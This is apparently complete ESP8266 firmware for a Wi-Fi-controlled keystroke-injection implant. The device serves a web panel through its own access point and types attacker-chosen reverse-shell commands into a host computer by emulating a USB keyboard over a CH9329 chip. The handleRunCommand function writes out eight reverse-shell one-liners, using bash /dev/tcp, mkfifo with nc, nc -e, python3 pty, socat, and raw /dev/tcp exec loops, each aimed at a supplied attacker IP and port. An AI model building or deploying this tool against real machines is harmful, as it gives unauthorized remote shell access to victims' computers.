#include <ESP8266WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <SoftwareSerial.h>
#include <ArduinoJson.h>
#include <LittleFS.h>
#include <FS.h>
#include "secrets.h"  // import for AP password





/*
 * *******************************************************
 * System Information Printing for ESP8266
 * *******************************************************
 * Uncomment the following line to enable printing of 
 * detailed system information about the ESP8266 module.
 * 
 * This includes useful details such as:
 * - CPU frequency
 * - Flash size
 * - Wi-Fi status (IP address, MAC address, etc.)
 * 
 * This is useful for debugging or understanding the system's
 * resources and current status.
 * *******************************************************
 */
#define PRINT_INFO



/*
 * *******************************************************
 * Intranet Mode for ESP8266
 * *******************************************************
 * Define USE_INTRANET to connect the ESP8266 to your home 
 * intranet for easier debugging during development.
 * 
 * When this mode is enabled, the ESP8266 will connect to 
 * your home Wi-Fi network (intranet). This allows you to 
 * access the ESP8266 web server from your browser without 
 * needing to reconnect to the network each time, which 
 * simplifies testing and debugging.
  * *******************************************************
 */
// #define USE_INTRANET




/*
  *******************************************************
  SoftwareSerial Setup for ESP8266 and CH9329 Communication
  *******************************************************
  This section of the code initializes a `SoftwareSerial` object that enables communication 
  between the ESP8266 and an CH9329 using specific RX and TX pins. The `SoftwareSerial` 
  library allows communication on any digital pins, but in this case, the ESP8266 will 
  use pins 4 (RX) and 5 (TX).

  - `rxPin`: The pin on the ESP8266 that receives data from the CH9329.
  - `txPin`: The pin on the ESP8266 that sends data to the CH9329.

  RX = rxPin, TX = txPin

  *******************************************************
*/
#define CH9329_RX 4  // RX pin for CH9329
#define CH9329_TX 5  // TX pin for CH9329
SoftwareSerial CH9329_SERIAL(CH9329_RX, CH9329_TX);





/*
  *******************************************************
  IP Configuration for ESP8266
  *******************************************************
  This part of the code defines various IP settings for the ESP8266.
  - `Actual_IP`: Stores the IP address assigned to the ESP8266 when it connects to the home intranet (used in debug mode).
  - `PageIP`: The default IP address for the ESP8266 when it is acting as an Access Point (AP).
  - `gateway`: The gateway IP address for the ESP8266 when it's set up as an Access Point.
  - `subnet`: The subnet mask used for the ESP8266 when it's set up as an Access Point.
  *******************************************************
*/
IPAddress Actual_IP;
IPAddress PageIP(192, 168, 1, 1);    // Default IP address of the AP
IPAddress gateway(192, 168, 1, 1);   // Gateway for the AP
IPAddress subnet(255, 255, 255, 0);  // Subnet mask for the AP








/*
  *******************************************************
  Web Server and DNS Redirection Setup
  *******************************************************
  This part of the code sets up a web server on the ESP8266 and configures DNS redirection.
  - `server`: An instance of the ESP8266 WebServer that listens on port 80 (HTTP default port) to handle incoming HTTP requests.
  - `dnsServer`: An instance of the DNS server for handling custom DNS redirection. The ESP8266 can act as a DNS server, redirecting specific domain requests to its own IP address.
  - `homeIP`: The IP address that the ESP8266 will respond with when a certain domain (`evilcorp.io` in this case) is queried. 
  -  This address can be the IP address of the ESP8266 in AP mode or any custom address.
  - `domain`: The domain name that will be redirected to the ESP8266's IP address (e.g., `evilcorp.io`). 
  -  When a device queries this domain, the ESP8266 will intercept the request and respond with its own IP address.
  *******************************************************
*/

// Create an instance of the ESP8266 WebServer
AsyncWebServer server(80);  // HTTP server running on port 80

// DNS server instance
DNSServer dnsServer;

// IP address to return for a specific domain
IPAddress homeIP(192, 168, 1, 1);  // Redirected IP address for the domain

// The domain name to redirect to the ESP8266's IP address
const char *domain = "evilcorp.io";









/*
  The `setup()` function is called once when the device starts up or is reset.
  It is used for initializing the system, setting up configurations, and establishing connections.
*/

void setup() {
  // Start serial communication for debugging purposes (baud rate 115200)
  Serial.begin(115200);

  // Initialize SoftwareSerial communication with Arduino (baud rate 9600)
  CH9329_SERIAL.begin(9600);

  // Wait for serial port to connect (only needed for native USB ports)
  while (!Serial) {
    ;  // Wait for serial port to connect
  }

  // A small delay before starting the setup process
  delay(500);

  // Initialize the LittleFS for file storage
  if (!LittleFS.begin()) {
    Serial.println("LittleFS Mount Failed");
    return;  // Stop further execution if LittleFS fails to mount
  }



// If USE_INTRANET is defined, connect to a specific Wi-Fi network (home intranet)
#ifdef USE_INTRANET
  WiFi.begin(LOCAL_SSID, LOCAL_PASS);  // Connect to Wi-Fi using predefined credentials


  // Wait until the ESP8266 successfully connects to Wi-Fi
  //Serial.print("Connecting to WiFi: ");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);  // Wait half a second before trying again
    //Serial.print(".");     // Print a dot for each connection attempt
  }


  // Store the current IP address for further use
  Actual_IP = WiFi.localIP();

#endif




// If USE_INTRANET is not defined, configure the ESP as an access point
#ifndef USE_INTRANET
  startAP();  // Start the ESP8266 in Access Point (AP) mode

  // Start the DNS server on port 53 for redirecting requests to the ESP's IP
  dnsServer.start(53, domain, homeIP);
#endif




  // Start the HTTP server to listen for incoming HTTP requests on port 80
  server.begin();


  /*
  Define Routes for the HTTP Server:
  - The server.on() function is used to define different routes (URLs) and associate them with specific handlers (functions).
  - Each route corresponds to a specific page or action within the web application.
*/

  // Route for the root URL (login page)
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(LittleFS, "/index.html", "text/html");
  });


  // Route for the favicon (used to display the website's icon)
  server.on("/favicon-48x48.png", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send(LittleFS, "/favicon-48x48.png", "image/png");
  });




  server.on("/run_shell", HTTP_POST, [](AsyncWebServerRequest *request) {
    handleRunCommand(request);
  });


  // Serve the system info when /system_info is requested
  server.on("/system_info", HTTP_GET, [](AsyncWebServerRequest *request) {
    String response = "{\"system_info\":\"" + escapeJson(getSystemInfo()) + "\",";
    response += "\"memory_info\":\"" + escapeJson(getMemoryInfo()) + "\",";
    response += "\"wifi_info\":\"" + escapeJson(getWiFiInfo()) + "\"}";

    request->send(200, "application/json", response);
  });


  // Handle non-existing routes with a 404 response
  server.onNotFound([](AsyncWebServerRequest *request) {
    request->send(LittleFS, "/404.html", "text/html");
  });



/*
 * If PRINT_INFO is defined, display additional information:
 * - This section will print system information, including CPU details, flash size, and Wi-Fi status, 
 *   if the `PRINT_INFO` macro is defined during compilation.
 * - This is useful for debugging or understanding the current state of the system.
 */
#ifdef PRINT_INFO

  // Display a banner and perform a system check
  banner();

  printInformation();  // Print system information if defined


  // Print information indicating that the system is ready
  Serial.println("\n\nSystem ready for further operations.");
  Serial.println("**************************************");

#endif
}







/*
 * The `loop()` function runs continuously in a cycle after `setup()` completes. It is used for handling 
 * repeated tasks such as monitoring user input, network requests, or device state updates.
 *
 * The `loop()` function typically includes:
 * 1. Handling requests to the HTTP server.
 * 2. Checking for network activity or other event-driven tasks.
 * 3. Periodic or continuous tasks like DNS handling, server management, or sensor readings.
 *
 */
void loop() {

#ifndef USE_INTRANET               // Use DNS server to process incoming DNS queries
  dnsServer.processNextRequest();  // Process DNS requests
#endif
}




/*
 * Function to start the Access Point (AP) mode on the ESP8266.
 * This sets up a wireless network with a specified SSID and password, 
 * configures its network parameters, and displays its IP address.
 */
void startAP() {
  // Start the Access Point with the defined SSID and password
  WiFi.softAP(AP_SSID, AP_PASS);
  delay(100);  // Brief delay to ensure the AP starts properly

  // Configure the Access Point's network settings: IP, gateway, and subnet
  WiFi.softAPConfig(PageIP, gateway, subnet);
  delay(100);  // Brief delay to ensure network settings are applied

  // Notify that the Access Point is active
  Serial.println("\nAccess Point Started");

  // Retrieve and display the IP address assigned to the Access Point
  Actual_IP = WiFi.softAPIP();
  Serial.print("IP address: ");
  Serial.println(Actual_IP);
}









  /*
 * Function to display a boot banner and initialization progress on the serial monitor.
 * Provides a visual indication of system startup, useful for debugging and user feedback.
 */
  void banner() {
    delay(1000);
    Serial.println("\n\n");
    Serial.println("*******************************");
    Serial.println("*                             *");
    Serial.println("*   ESP-07 System Booting     *");
    Serial.println("*       Please wait...        *");
    Serial.println("*                             *");
    Serial.println("*******************************");

    Serial.print("Initializing");
    for (int i = 0; i < 10; i++) {
      delay(500);
      Serial.print(".");
    }

    Serial.print("\n");
  }






  /*
 * Function to print ESP8266 system and Wi-Fi information for debugging purposes.
 * This function provides an overview of system performance, flash memory usage, and current Wi-Fi connection details.
 */
  void printInformation() {

    Serial.println("\nChecking components...\n");
    delay(500);

    Serial.println("\n\n");

    Serial.println("ESP Information");
    Serial.println("**************************************");

    // Print list of files and their sizes in LittleFS
    listFiles("/");
    Serial.println("\n\n");

    Serial.print(getSystemInfo());
    Serial.println("\n\n");

    Serial.print(getMemoryInfo());
    Serial.println("\n\n");

    Serial.print(getWiFiInfo());
  }






  // Function to get system info
  String getSystemInfo() {
    String sysInfo = "ESP8266 Chip Model: ESP-07\n";
    sysInfo += "Chip ID: " + String(ESP.getChipId()) + "\n";
    sysInfo += "Flash Chip ID: " + String(ESP.getFlashChipId()) + "\n";
    sysInfo += "Flash Chip Size: " + String(ESP.getFlashChipSize()) + " bytes\n";
    sysInfo += "Flash Chip Speed: " + String(ESP.getFlashChipSpeed() / 1000000) + " MHz\n";
    sysInfo += "CPU Speed: " + String(ESP.getCpuFreqMHz()) + " MHz\n";
    sysInfo += "SDK Version: " + String(ESP.getSdkVersion()) + "\n";
    sysInfo += "Sketch Size: " + String(ESP.getSketchSize()) + " bytes\n";
    sysInfo += "Free Sketch Space: " + String(ESP.getFreeSketchSpace()) + " bytes\n";
    sysInfo += "Free Heap: " + String(ESP.getFreeHeap()) + " bytes\n";

    // Check WiFi
    sysInfo += "Wi-Fi: Supported\n";

    // ESP8266 does not have Bluetooth, ULP coprocessor or temperature sensor
    sysInfo += "Bluetooth: Not Available\n";
    sysInfo += "Ultra Low Power (ULP) Co-Processor: No\n";
    sysInfo += "Temperature Sensor: Not Available\n";

    return sysInfo;
  }



  // Function to get memory info
  String getMemoryInfo() {
    String memInfo = "Free Heap: " + String(ESP.getFreeHeap()) + " bytes\n";

    // ESP8266 does not have PSRAM
    memInfo += "PSRAM: Not Available\n";

    // Check heap fragmentation
    memInfo += "Heap Fragmentation: " + String(ESP.getHeapFragmentation()) + "%\n";

    return memInfo;
  }



  // Function to get Wi-Fi info
  String getWiFiInfo() {
    String wifiInfo = "";

    if (WiFi.getMode() == WIFI_AP) {
      // Access Point (AP) Mode
      wifiInfo += "Mode: Access Point (AP)\n";
      wifiInfo += "SSID: " + WiFi.softAPSSID() + "\n";
      wifiInfo += "Password: " + String(AP_PASS) + "\n";
      wifiInfo += "AP IP Address: " + WiFi.softAPIP().toString() + "\n";
      wifiInfo += "MAC Address: " + WiFi.softAPmacAddress() + "\n";
    } else if (WiFi.getMode() == WIFI_STA) {
      // Station (Client) Mode
      wifiInfo += "Mode: Station (Client)\n";
      wifiInfo += "SSID: " + WiFi.SSID() + "\n";
      wifiInfo += "Status: " + String(WiFi.status() == WL_CONNECTED ? "Connected" : "Disconnected") + "\n";
      wifiInfo += "IP Address: " + WiFi.localIP().toString() + "\n";
      wifiInfo += "Gateway: " + WiFi.gatewayIP().toString() + "\n";
      wifiInfo += "Subnet Mask: " + WiFi.subnetMask().toString() + "\n";
      wifiInfo += "MAC Address: " + WiFi.macAddress() + "\n";
      wifiInfo += "DNS 1: " + WiFi.dnsIP(0).toString() + "\n";
      wifiInfo += "DNS 2: " + WiFi.dnsIP(1).toString() + "\n";
      wifiInfo += "RSSI (Signal Strength): " + String(WiFi.RSSI()) + " dBm\n";
    } else {
      // WiFi not initialized or in a different mode
      wifiInfo += "WiFi not connected or initialized\n";
    }

    return wifiInfo;
  }



  // Function to escape JSON strings
  String escapeJson(const String &input) {
    String output = "";
    for (unsigned int i = 0; i < input.length(); i++) {
      char c = input.charAt(i);
      if (c == '"') {
        output += "\\\"";  // Escape double quotes
      } else if (c == '\\') {
        output += "\\\\";  // Escape backslash
      } else if (c == '\n') {
        output += "\\n";  // Escape newlines
      } else if (c == '\r') {
        output += "\\r";  // Escape carriage returns
      } else {
        output += c;  // Other characters stay the same
      }
    }
    return output;
  }



  /*
 * Function to list files stored in LittleFS along with their sizes.
 * This is primarily used for debugging purposes to verify file availability and sizes.
 * The function takes a directory path as input and prints each file's name and size.
 */
  void listFiles(const char *dir) {
    Serial.println("Listing files in LittleFS:");

    // Open the directory
    File root = LittleFS.open(dir, "r");
    if (!root) {
      Serial.println("Failed to open directory");
      return;
    }

    // Find the first file in the directory
    File file = root.openNextFile();
    while (file) {
      String fileName = file.name();
      size_t fileSize = file.size();

      Serial.print("File: ");
      Serial.print(fileName);
      Serial.print(" | Size: ");
      Serial.println(fileSize);

      // Go to the next file
      file = root.openNextFile();
    }
  }



  void sendString(const char *text);

  /*
 * Function to handle the run command by processing the incoming data
 * from the client and sending it to the CH9329 via SoftwareSerial.
 * The function also logs important data for debugging
 */

  // Function to handle the run command
  void handleRunCommand(AsyncWebServerRequest * request) {

    // Check if POST request contains 'shell', 'ip', and 'port' parameters
    if (request->hasParam("shell", true) && request->hasParam("ip", true) && request->hasParam("port", true)) {
      request->send(200, "application/json", "{\"success\": true}");

      // Use char arrays instead of String to avoid dynamic memory allocation
      char shellType[32], ipAddress[32], port[8];
      strncpy(shellType, request->getParam("shell", true)->value().c_str(), sizeof(shellType) - 1);
      strncpy(ipAddress, request->getParam("ip", true)->value().c_str(), sizeof(ipAddress) - 1);
      strncpy(port, request->getParam("port", true)->value().c_str(), sizeof(port) - 1);


      // Log the received data for debugging
      Serial.println("\n\n");
      Serial.println("Data Received");
      Serial.println("************************");
      Serial.println(String("Command:    ") + shellType);
      Serial.println(String("IP Address: ") + ipAddress);
      Serial.println(String("Port:       ") + port);


      // Prepare a static buffer to hold the command
      char command[512];  // Ensure buffer is large enough for all cases
      memset(command, 0, sizeof(command));

      // Construct command based on shell type
      if (strcmp(shellType, "bash") == 0) {
        snprintf(command, sizeof(command), "bash -i >& /dev/tcp/%s/%s 0>&1 & disown && exit", ipAddress, port);
      } else if (strcmp(shellType, "mkfifo") == 0) {
        snprintf(command, sizeof(command), "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %s >/tmp/f", ipAddress, port);
      } else if (strcmp(shellType, "nc") == 0) {
        snprintf(command, sizeof(command), "nc %s %s -e /bin/bash & disown && exit", ipAddress, port);
      } else if (strcmp(shellType, "python3") == 0) {
        snprintf(command, sizeof(command), "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%s));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")' & disown && exit", ipAddress, port);
      } else if (strcmp(shellType, "socat") == 0) {
        snprintf(command, sizeof(command), "socat TCP:%s:%s EXEC:sh & disown && exit", ipAddress, port);
      } else if (strcmp(shellType, "socat-tty") == 0) {
        snprintf(command, sizeof(command), "socat TCP:%s:%s EXEC:'sh',pty,stderr,setsid,sigint,sane & disown && exit", ipAddress, port);
      } else if (strcmp(shellType, "sh-196") == 0) {
        snprintf(command, sizeof(command), "0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196 & disown && exit", ipAddress, port);
      } else if (strcmp(shellType, "sh-loop") == 0) {
        snprintf(command, sizeof(command), "exec 5<>/dev/tcp/%s/%s; while read line 0<&5; do $line 2>&5 >&5; done & disown && exit", ipAddress, port);
      } else {
        snprintf(command, sizeof(command), "echo \"Unsupported shell type\"");
      }

      delay(1000);

      Serial.print("Sending string: ");
      Serial.println(command);
      delay(10);
      sendAltEnter();

      delay(200);
      sendString(command);

      delay(10);
      sendEnter();

    } else {
      // If any of the parameters are missing, return an error
      request->send(400, "application/json", "{\"success\": false, \"error\": \"Missing required parameters\"}");
    }
  }






  // Function to calculate checksum
  uint8_t calculateChecksum(const uint8_t *data, size_t length) {
    uint8_t checksum = 0;
    for (size_t i = 0; i < length; i++) {
      checksum += data[i];
    }
    return checksum;
  }




  // Function to send a command to CH9329
  void sendCommand(const uint8_t *command, size_t length) {
    Serial.print("Sending command: ");
    for (size_t i = 0; i < length; i++) {
      Serial.print(command[i], HEX);
      Serial.print(" ");
    }
    Serial.println();

    CH9329_SERIAL.write(command, length);
    CH9329_SERIAL.write(calculateChecksum(command, length));
    CH9329_SERIAL.flush();

    // Reduce delay or use esp_task_wdt_reset()
    delay(10);
  }




  // Function to send a keyboard command
  void sendKeyCommand(uint8_t modifier, uint8_t keycode) {
    const uint8_t command[] = { 0x57, 0xAB, 0x00, 0x02, 0x08, modifier, 0x00, keycode, 0x00, 0x00, 0x00, 0x00, 0x00 };
    sendCommand(command, sizeof(command));
  }




  // Function to release all keys
  void releaseKeys() {
    const uint8_t command[] = { 0x57, 0xAB, 0x00, 0x02, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
    sendCommand(command, sizeof(command));
  }



  // Function to send a string as key commands
  void sendString(const char *text) {
    while (*text) {
      uint8_t keycode = 0, modifier = 0;
      char c = *text++;

      /*
         * Mapping characters to HID codes:
         *
         * A-Z (sa Shift modifikatorom):
         *      a -> 0x04         A -> 0x04 (Shift 0x02)
         *      b -> 0x05         B -> 0x05 (Shift 0x02)
         *      c -> 0x06         C -> 0x06 (Shift 0x02)
         *      d -> 0x07         D -> 0x07 (Shift 0x02)
         *      e -> 0x08         E -> 0x08 (Shift 0x02)
         *      f -> 0x09         F -> 0x09 (Shift 0x02)
         *      g -> 0x0A         G -> 0x0A (Shift 0x02)
         *      h -> 0x0B         H -> 0x0B (Shift 0x02)
         *      i -> 0x0C         I -> 0x0C (Shift 0x02)
         *      j -> 0x0D         J -> 0x0D (Shift 0x02)
         *      k -> 0x0E         K -> 0x0E (Shift 0x02)
         *      l -> 0x0F         L -> 0x0F (Shift 0x02)
         *      m -> 0x10         M -> 0x10 (Shift 0x02)
         *      n -> 0x11         N -> 0x11 (Shift 0x02)
         *      o -> 0x12         O -> 0x12 (Shift 0x02)
         *      p -> 0x13         P -> 0x13 (Shift 0x02)
         *      q -> 0x14         Q -> 0x14 (Shift 0x02)
         *      r -> 0x15         R -> 0x15 (Shift 0x02)
         *      s -> 0x16         S -> 0x16 (Shift 0x02)
         *      t -> 0x17         T -> 0x17 (Shift 0x02)
         *      u -> 0x18         U -> 0x18 (Shift 0x02)
         *      v -> 0x19         V -> 0x19 (Shift 0x02)
         *      w -> 0x1A         W -> 0x1A (Shift 0x02)
         *      x -> 0x1B         X -> 0x1B (Shift 0x02)
         *      y -> 0x1C         Y -> 0x1C (Shift 0x02)
         *      z -> 0x1D         Z -> 0x1D (Shift 0x02)
         *      
         *      Space: 0x2C
         *      Enter: 0x28
         *      
         *
         * Numbers:
         *      1 -> 0x1E
         *      2 -> 0x1F
         *      3 -> 0x20
         *      4 -> 0x21
         *      5 -> 0x22
         *      6 -> 0x23
         *      7 -> 0x24
         *      8 -> 0x25
         *      9 -> 0x26
         *      0 -> 0x27
         */

      if (c >= 'a' && c <= 'z') {
        keycode = 0x04 + (c - 'a');  // a-z: 0x04 - 0x1D
      } else if (c >= 'A' && c <= 'Z') {
        keycode = 0x04 + (c - 'A');  // A-Z: 0x04 - 0x1D
        modifier = 0x02;             // Shift modifier
      } else if (c >= '1' && c <= '9') {
        keycode = 0x1E + (c - '1');  // 1-9: 0x1E - 0x26
      } else if (c == '0') {
        keycode = 0x27;  // 0: 0x27
      } else if (c == ' ') {
        keycode = 0x2C;  // Space: 0x2C
      } else if (c == '\n') {
        keycode = 0x28;  // Enter: 0x28
      } else {

        // Handle special characters
        switch (c) {
          case '!':
            modifier = 0x02;
            keycode = 0x1E;
            break;  // Shift + 1 -> 0x1E
          case '@':
            modifier = 0x02;
            keycode = 0x1F;
            break;  // Shift + 2 -> 0x1F
          case '#':
            modifier = 0x02;
            keycode = 0x20;
            break;  // Shift + 3 -> 0x20
          case '$':
            modifier = 0x02;
            keycode = 0x21;
            break;  // Shift + 4 -> 0x21
          case '%':
            modifier = 0x02;
            keycode = 0x22;
            break;  // Shift + 5 -> 0x22
          case '^':
            modifier = 0x02;
            keycode = 0x23;
            break;  // Shift + 6 -> 0x23
          case '&':
            modifier = 0x02;
            keycode = 0x24;
            break;  // Shift + 7 -> 0x24
          case '*':
            modifier = 0x02;
            keycode = 0x25;
            break;  // Shift + 8 -> 0x25
          case '(':
            modifier = 0x02;
            keycode = 0x26;
            break;  // Shift + 9 -> 0x26
          case ')':
            modifier = 0x02;
            keycode = 0x27;
            break;                          // Shift + 0 -> 0x27
          case '-': keycode = 0x2D; break;  // -: 0x2D
          case '_':
            modifier = 0x02;
            keycode = 0x2D;
            break;                          // Shift + - -> 0x2D
          case '=': keycode = 0x2E; break;  // =: 0x2E
          case '+':
            modifier = 0x02;
            keycode = 0x2E;
            break;  // Shift + = -> 0x2E
          case '{':
            modifier = 0x02;
            keycode = 0x2F;
            break;  // Shift + [ -> 0x2F
          case '}':
            modifier = 0x02;
            keycode = 0x30;
            break;                          // Shift + ] -> 0x30
          case '[': keycode = 0x2F; break;  // [: 0x2F
          case ']': keycode = 0x30; break;  // ]: 0x30
          case '|':
            modifier = 0x02;
            keycode = 0x31;
            break;                           // Shift + \ -> 0x31
          case '\\': keycode = 0x31; break;  // \: 0x31
          case ':':
            modifier = 0x02;
            keycode = 0x33;
            break;                          // Shift + ; -> 0x33
          case ';': keycode = 0x33; break;  // ;: 0x33
          case '"':
            modifier = 0x02;
            keycode = 0x34;
            break;                           // Shift + ' -> 0x34
          case '\'': keycode = 0x34; break;  // ': 0x34
          case '<':
            modifier = 0x02;
            keycode = 0x36;
            break;  // Shift + , -> 0x36
          case '>':
            modifier = 0x02;
            keycode = 0x37;
            break;                          // Shift + . -> 0x37
          case ',': keycode = 0x36; break;  // ,: 0x36
          case '.': keycode = 0x37; break;  // .: 0x37
          case '?':
            modifier = 0x02;
            keycode = 0x38;
            break;                          // Shift + / -> 0x38
          case '/': keycode = 0x38; break;  // /: 0x38
          case '~':
            modifier = 0x02;
            keycode = 0x35;
            break;                          // Shift + ` -> 0x35
          case '`': keycode = 0x35; break;  // `: 0x35
          default: continue;                // Ignore unsupported characters
        }
      }

      // For debugging
      //        Serial.print("Keycode: ");
      //        Serial.print(keycode, HEX);
      //        Serial.print(" Modifier: ");
      //        Serial.println(modifier, HEX);

      if (keycode) {
        sendKeyCommand(modifier, keycode);
        delay(5);
        releaseKeys();

        // Reset watchdog
        ESP.wdtFeed();
      }
    }
  }




  // Function to send Alt + Enter
  void sendAltEnter() {
    sendKeyCommand(0x04, 0x28);  // ALT + Enter
    releaseKeys();               // Releasing the keys
  }

  //  Function to open Linux Terminal
  void sendAltCtrlT() {
    sendKeyCommand(0x04 | 0x01, 0x14);  // ALT + CTRL + T
    releaseKeys();                      // Releasing the keys
  }

  //  Function to open run in Windows
  void sendWinR() {
    sendKeyCommand(0x08, 0x15);  // WIN + R
    releaseKeys();               // Releasing the keys
  }

  // Send Enter key
  void sendEnter() {
    sendKeyCommand(0x00, 0x28);  // Enter (without modifiers)
    releaseKeys();               // Releasing the keys
  }


  // end of code
